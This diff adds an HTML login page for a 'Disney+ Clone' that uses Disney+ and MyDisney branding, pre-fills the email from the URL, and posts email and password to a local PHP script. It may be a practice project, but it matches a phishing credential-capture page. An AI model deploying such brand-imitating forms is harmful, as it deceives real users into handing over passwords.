@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Disney+ Clone</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        function getEmailFromURL() {
+            let urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email');
+        }
+
+        function populateEmail() {
+            let email = getEmailFromURL();
+            if (email) {
+                document.getElementById('email-display').textContent = email;
+                document.getElementById('email-input').value = email;
+            } else {
+                window.location.href = 'login_email.html';
+            }
+        }
+
+        window.onload = populateEmail;
+    </script>
+</head>
+<body>
+    <div class="body-login">
+        <div class="login-box">
+            <img src="disney-logo-white.png" alt="Disney+" class="logo-float">
+            <img src="mydisney-logo.png" alt="MyDisney Logo" class="mydisney-logo">
+            <h2>With a MyDisney account, you can log in to Disney+ and other services across The Walt Disney Family of Companies.</h2>
+            <p>Create your account using <strong id="email-display"></strong></p>
+            <form action="data/register.php" method="POST">
+                <input type="hidden" id="email-input" name="email">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Password">
+                <button type="submit">Log In</button>
+            </form>
+            <div class="footer">
+                <p>Disney+ is part of The Walt Disney Family of Companies</p>
+                <p>MyDisney lets you seamlessly log in to services and experiences across The Walt Disney Family of Companies, such as Disney+, ESPN, Walt Disney World, and more.</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
